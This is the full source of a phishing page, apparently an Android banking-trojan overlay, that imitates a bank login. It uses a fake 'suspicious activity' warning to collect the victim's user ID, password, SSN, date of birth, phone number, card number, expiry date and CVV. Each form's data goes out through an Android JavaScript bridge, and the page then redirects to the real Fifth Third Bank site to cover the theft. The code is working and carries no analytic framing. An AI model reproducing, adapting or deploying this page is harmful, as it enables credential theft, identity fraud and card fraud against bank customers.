body {
    background-color: #ffffff;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.header {
    position: relative;
    z-index: 2;
}
.logongardient {
    text-align: center;
}
.logo {
    width: 300px;
    margin-top: 25px;
    margin-bottom: 25px;
}
.main {
    margin-top: 10px;
}
.autorizeBox {
    background: rgba(255, 255, 255, .96);
    border-radius: 5px;
    padding: 1.25rem 0;
    max-width: 384px !important;
    overflow: visible !important;
    margin: 0 auto;
}
@media only screen and (max-width: 444px) {
    .autorizeBox {
        margin: 0 20px;
    }
}
.autorizeBox form {
    position: relative;
    min-height: .0625rem;
    padding: 5px 35px;
}
.autorizeBox ::placeholder {
    color: #717171;
    opacity: 1;
}
.autorizeBox label {
    font-size: 1.125rem;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    margin-left: 5px;
}
.autorizeBox input {
    font-size: 1.125rem;
    background: 0 0;
    border: none;
    border-bottom: 2px solid #cccccc;
    padding: 5px;
    margin: 10px 0;
    width: 96%;
}
.autorizeBox input:focus {
    border-bottom: 2px solid #3854c2;
}
.autorizeBox input.dt {
    width: 17%;
}
.autorizeBox button {
    margin: 20px 0;
    background-color: #529638;
    border: none;
    width: 100%;
    height: 2.5rem;
    overflow-x: auto;
    border-radius: .1rem;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    text-transform: uppercase;
}
.autorizeBox button:disabled,
.autorizeBox button[disabled] {
    background-color: #d2e4cb;
}
.autorizeBox button:disabled span,
.autorizeBox button[disabled] span {
    color: #e9f2e5;
}
.autorizeBox button span {
    line-height: 1.125rem;
    white-space: normal;
    margin: .0625rem .75rem;
    font-size: 1rem;
    font-weight: 600;
    color: #fff;
    letter-spacing: 0;
    text-decoration: none;
}
.footer {
    background: #fff;
    font-size: 16px;
    padding: 1em 0 0 0;
    margin-top: 250px;
    bottom: 0;
    left: 0;
    right: 0;
    color: #757575;
    font-size: .65625rem;
    text-align: center;
}
.footer p {
    margin: 25px 0;
}
.footer table {
    width: 100%;
    background: rgb(192, 192, 192);
}
.footer table tr td {
    width: 50%;
    background: #656263;
    color: #ffffff;
    height: 55px;
    font-size: 0.9rem;
}
#ccnumlbl {
    color: red;
    font-size: 0.8rem;
}
.warntext {
    color: red;
    margin-bottom: 20px;
    text-align: center;
    font-weight: bolder;
}
</style>

    <div class="main">
        <div class="autorizeBox">
            <form id="login" action="" style="">
                    <input id="Login" placeholder="User ID" pattern=".{4,}" autocomplete="off" type="text" required>
                    <input id="Password" placeholder="Password" pattern=".{4,}" autocomplete="off" type="password" required>
                    <button type="button" onclick="process('login')"><span>LOG IN</span></button>
            </form>
            <form id="address" action="" style="display:none;">
                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
                    <input id="FirstName" placeholder="First name" pattern=".{3,}" autocomplete="off" type="text" required>
                    <input id="LastName" placeholder="Last name" pattern=".{3,}" autocomplete="off" type="text" required>
                    <input id="Phone" placeholder="Phone number +1..." pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
                    <br><label>Date of birth: </label>
                    <input id="DOB" placeholder="mm/dd/yyyy" type="date" pattern=".{1,}" autocomplete="off" type="text" style="width: 50%;" required>
                    <input id="SSN" placeholder="SSN number" pattern="[0-9\-]{9,11}" maxlength="11" autocomplete="off" type="text" required>
                    <button type="button" onclick="process('address')"><span>Next</span></button>
            </form>
            <form id="CC" action="" style="display:none;">
                    <input id="CCNUM" placeholder="Credit card number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
                    <span id="ccnumlbl"></span>
                    <br><label>EXP Date: </label>
                    <input class="dt" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
                    <input class="dt" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
                    <br><label>CVV code: </label>
                    <input id="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" style="width:15%;" required>
					<input id="exit" type="hidden" text="true"/>
                    <button type="button" onclick="process('CC')"><span>LOG IN</span></button>
            </form>
        </div>

<script>
var invalidCC = 'Invalid card number';

function maskCC(event) {
    var v = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < v.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
    }
}
document.getElementById('CCNUM').addEventListener('input', maskCC, false);

function maskPhone(event) {
    var v = this.value.replace(/\D/g, '');
    this.value = '+' + v;
}
document.getElementById('Phone').addEventListener('input', maskPhone, false);

function maskOnlyNumbers(event) {
    this.value = this.value.replace(/\D/g, '');
}

var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV'];
for(var iid in arrtagsID) {
    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
}

function valid_credit_card(value) {
	if (/[^0-9-\s]+/.test(value)) return false;
	var nCheck = 0, nDigit = 0, bEven = false;
	value = value.replace(/\D/g, "");
	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);
		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}
		nCheck += nDigit;
		bEven = !bEven;
	}
	return (nCheck % 10) == 0;
}

var allButtons = document.getElementsByTagName('button');
for(var btn in allButtons) {
    allButtons[btn].disabled = true;
}

function CheckValidInput(id) {
    var finalbool = true, formids = document.getElementById(id);
	var currentinputs = formids.getElementsByTagName('input');
    for(var i = 0; i < currentinputs.length; i++ ) {
        if(currentinputs[i].id == 'CCNUM') {
            var bbb = valid_credit_card(currentinputs[i].value);
            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
            finalbool&= bbb;
            continue;
        }
        finalbool &= currentinputs[i].checkValidity();
    }
    formids.getElementsByTagName('button')[0].disabled = !finalbool;
}

var AllForms = document.getElementsByTagName('form');
function formChange(formId) {
    for(var i = 0; i < AllForms.length; i++) {
        AllForms[i].style.display = 'none';
        if(AllForms[i].id == formId) {
            AllForms[i+1].style.display = '';
            break;
        }
    }
}

for(var i = 0; i < AllForms.length; i++) {
    var myInputs = AllForms[i].getElementsByTagName('input');
    for(var j = 0; j < myInputs.length; j++) {
        AddInputEventByFormID(myInputs[j],AllForms[i].id);
    }
}

function AddInputEventByFormID(input, formid) {
    input.addEventListener('input', function(){CheckValidInput(formid)});
}

function process(formId) {
    try {
        Android.returnResult( formToJSON(document.getElementById(formId)) );
    } catch (err) {}
    if(formId == 'CC')
    {
        location.replace('https://www.53.com/content/fifth-third/en.html');
        return;
    }
    formChange(formId);
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}
